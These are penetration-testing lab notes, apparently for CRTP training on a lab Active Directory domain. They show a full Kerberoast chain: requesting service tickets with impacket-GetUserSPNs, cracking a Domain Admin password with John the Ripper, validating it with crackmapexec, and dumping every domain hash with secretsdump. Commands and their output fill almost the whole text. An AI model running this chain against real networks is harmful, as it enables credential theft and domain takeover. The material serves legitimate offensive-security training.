#### Theory can be found in [[2. Domain Privilege Escalation#2. Kerberoast]] ####

- Find Kerberoastable users (services that run on behalf of user accounts in the AD, not computer accounts).
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# impacket-GetUserSPNs dollarcorp.moneycorp.local/student303:a5fdNPDwScrD7T2A -dc-ip 172.16.2.1 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName                                 Name      MemberOf                                                       PasswordLastSet             LastLogon                   Delegation  
---------------------------------------------------  --------  -------------------------------------------------------------  --------------------------  --------------------------  -----------
SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL         websvc                                                                   2022-11-14 14:42:13.544236  2023-08-06 17:33:16.724602  constrained 
SNMP/ufc-adminsrv                                    websvc                                                                   2022-11-14 14:42:13.544236  2023-08-06 17:33:16.724602  constrained 
MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433  svcadmin  CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local  2022-11-14 19:06:37.624230  2023-08-06 19:25:43.612567              
MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local       svcadmin  CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local  2022-11-14 19:06:37.624230  2023-08-06 19:25:43.612567

<snip>
```

- Crack the TGSs with John the Ripper.
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# john kerberos.tgs --wordlist=10k-worst-pass.txt       
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*ThisisBlasphemyThisisMadness!! (?)     
1g 0:00:00:00 DONE (2023-08-07 08:54) 33.33g/s 333633p/s 401900c/s 401900C/s 1fuck..eyphed
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# john kerberos.tgs --show
?:*ThisisBlasphemyThisisMadness!!

1 password hash cracked, 0 left
```

- Verify that the password is valid.
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# crackmapexec smb 172.16.2.1 -u websvc -p '*ThisisBlasphemyThisisMadness!!'
SMB         172.16.2.1      445    DCORP-DC         [*] Windows 10.0 Build 20348 x64 (name:DCORP-DC) (domain:dollarcorp.moneycorp.local) (signing:True) (SMBv1:False)
SMB         172.16.2.1      445    DCORP-DC         [-] dollarcorp.moneycorp.local\websvc:*ThisisBlasphemyThisisMadness!! STATUS_LOGON_FAILURE
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# crackmapexec smb 172.16.2.1 -u svcadmin -p '*ThisisBlasphemyThisisMadness!!'
SMB         172.16.2.1      445    DCORP-DC         [*] Windows 10.0 Build 20348 x64 (name:DCORP-DC) (domain:dollarcorp.moneycorp.local) (signing:True) (SMBv1:False)
SMB         172.16.2.1      445    DCORP-DC         [+] dollarcorp.moneycorp.local\svcadmin:*ThisisBlasphemyThisisMadness!! (🩸Blooded!🩸)
SMB         172.16.2.1      445    DCORP-DC         Node SVCADMIN@DOLLARCORP.MONEYCORP.LOCAL successfully set as owned in BloodHound
```

- `dcorp\svcadmin` is a DA.
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/dollarcorp.moneycorp.local]
└─# impacket-secretsdump dollarcorp.moneycorp.local/svcadmin:'*ThisisBlasphemyThisisMadness!!'@172.16.2.1             
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xbab78acd91795c983aef0534e0db38c7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a102ad5753f4c441e3af31c97fad86fd:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
dcorp\DCORP-DC$:aes256-cts-hmac-sha1-96:e1769e063ffd34ecd99450c5fd7ef860095a753f3909c4c6e9cd92ce466a110b
dcorp\DCORP-DC$:aes128-cts-hmac-sha1-96:ab26bfb73cb6812fb3a8154443bc6eda
dcorp\DCORP-DC$:des-cbc-md5:5b51f4df2ad3b629
dcorp\DCORP-DC$:plain_password_hex:eccb52b95bd8bf61f08386c94d27a3928413787ff0fa72bb7120e4a6a6aecaa4cef78e7ffb7cd6d2db3d4e84e39e4631da51d1aad2d46bfa12159be7b13008f352ae30594ebfc72ef2e37e9789b936db9a8dd1f37506ca1bc850695c6046802a8ca195e7127c18483eaf8382713bb75dbca76a1cb70cd52032a5569828d37b6ec0e8558038e788051e56f1eb4ab30ffbcee41bf5052343e96350e80f803def1876b9f9fb0452cc51a3e96c855ca17bfb9a7e756d3d615613859b242b8aba3c1df1b6646374a09632204c64d4376af8dc069239f455d463b890372edd55fe767e3d1915e36c119e4c23fd0aff3763087d
dcorp\DCORP-DC$:aad3b435b51404eeaad3b435b51404ee:9e629980175422a4356d024f6d348a49:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x558f948af84f9dec3acf3499b5e9af0de2d8e803
dpapi_userkey:0xb1b020a793cbecd7d3ad7aacbc6b73f33c9e4d43
[*] NL$KM 
 0000   21 55 A8 F7 64 DD 9A FA  80 95 0F 03 E8 E4 76 5E   !U..d.........v^
 0010   11 34 99 56 DE 62 E1 00  C6 FD 7D B8 14 AF 4F 73   .4.V.b....}...Os
 0020   58 C1 68 E3 16 E2 04 98  93 A5 39 C6 1B 7A E4 19   X.h.......9..z..
 0030   FE E6 EF DC 73 64 72 8C  F9 2A F2 5C 68 D2 DB 73   ....sdr..*.\h..s
NL$KM:2155a8f764dd9afa80950f03e8e4765e11349956de62e100c6fd7db814af4f7358c168e316e2049893a539c61b7ae419fee6efdc7364728cf92af25c68d2db73
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:af0686cc0ca8f04df42210c9ac980760:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e9815869d2090ccfca61c1fe0d23986:::
sqladmin\sqladmin:1113:aad3b435b51404eeaad3b435b51404ee:07e8be316e3da9a042a9cb681df19bf5:::
websvc\websvc:1114:aad3b435b51404eeaad3b435b51404ee:cc098f204c5887eaa8253e7c2749156f:::
srvadmin\srvadmin:1115:aad3b435b51404eeaad3b435b51404ee:a98e18228819e8eec3dfa33cb68b0728:::
appadmin\appadmin:1117:aad3b435b51404eeaad3b435b51404ee:d549831a955fee51a43c83efb3928fa7:::
svcadmin\svcadmin:1118:aad3b435b51404eeaad3b435b51404ee:b38ff50264b74508085d82c69794a4d8:::
testda\testda:1119:aad3b435b51404eeaad3b435b51404ee:a16452f790729fa34e8f3a08f234a82c:::

<snip>
```